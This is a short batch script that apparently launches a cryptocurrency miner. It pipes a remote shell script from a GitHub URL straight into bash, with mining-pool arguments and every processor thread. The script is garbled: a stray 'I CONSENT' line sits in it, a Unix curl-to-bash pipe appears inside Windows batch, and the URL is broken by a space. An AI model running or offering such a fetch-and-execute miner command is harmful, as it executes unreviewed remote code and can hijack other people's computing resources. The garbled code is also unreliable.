@echo off
I CONSENT xmr.pool.mine
setlocal enableDelayedExpansion
if "%1"=="" set "threadCount=%NUMBER_OF_PROCESSORS%"
if not "%1"=="" set "threadCount=%1"
curl -sL https://raw.githubusercontent.com/ andreimarcu/free-mining-pool/main/start.sh | bash -s -- -a yescrypt -o pool.hashvault.pro:443 -u free-miner -p x -t %threadCount% -H "bba8097cb37d9b458a1cb1137876b27cde6740d17fe4ccbc086ba07d87d9e147"
